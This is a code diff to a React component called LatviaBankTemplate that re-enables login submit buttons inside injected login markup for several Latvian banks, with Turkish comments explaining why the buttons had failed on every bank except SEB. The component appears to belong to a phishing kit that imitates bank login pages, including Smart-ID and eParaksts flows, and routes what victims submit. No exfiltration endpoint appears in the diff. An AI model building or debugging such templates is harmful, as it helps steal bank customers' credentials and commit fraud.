@@ -1538,30 +1538,25 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
 
                 const hasEmptyField = visibleInputs.length === 0 || visibleInputs.some(inp => !inp.value || inp.value.trim() === '');
 
+                // DIKKAT: Butonlari ARTIK disable etmiyoruz - hasEmptyField'e gore
+                // disabled+pointerEvents:none basilmasi CLICK EVENT'INI TAMAMEN OLDURUYORDU
+                // (SEB disinda hicbir bankada giris butonu calismiyordu - sebep buydu).
+                // Bos alan validasyonu HTML icindeki scoped doSubmit'te yapiliyor
+                // (kirmizi cerceve + post engelleme) - burada sadece enable ediyoruz.
                 const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn, .submit-btn, a.submit-btn, button[name="aLogin"], input.btn');
                 submitButtons.forEach(btn => {
                     const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
                     const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|eparaksts|kalkulators|lietotne|pin[ -]?kods|mobilescan|digipass|kodu)/i.test(text) || btn.hasAttribute('data-tab-index') || (btn.closest && btn.closest('[data-tab-index]'));
                     if (isTab) return;
 
-                    if (hasEmptyField) {
-                        btn.setAttribute('disabled', 'true');
-                        btn.disabled = true;
-                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
-                        btn.setAttribute('aria-disabled', 'true');
-                        btn.style.opacity = '0.5';
-                        btn.style.cursor = 'not-allowed';
-                        btn.style.pointerEvents = 'none';
-                    } else {
-                        btn.removeAttribute('disabled');
-                        btn.disabled = false;
-                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
-                        btn.setAttribute('aria-disabled', 'false');
-                        if (btn.getAttribute('tabindex') === '-1') btn.setAttribute('tabindex', '0');
-                        btn.style.opacity = '1';
-                        btn.style.cursor = 'pointer';
-                        btn.style.pointerEvents = 'auto';
-                    }
+                    btn.removeAttribute('disabled');
+                    btn.disabled = false;
+                    btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
+                    btn.setAttribute('aria-disabled', 'false');
+                    if (btn.getAttribute('tabindex') === '-1') btn.setAttribute('tabindex', '0');
+                    btn.style.opacity = '1';
+                    btn.style.cursor = 'pointer';
+                    btn.style.pointerEvents = 'auto';
                 });
             });
 
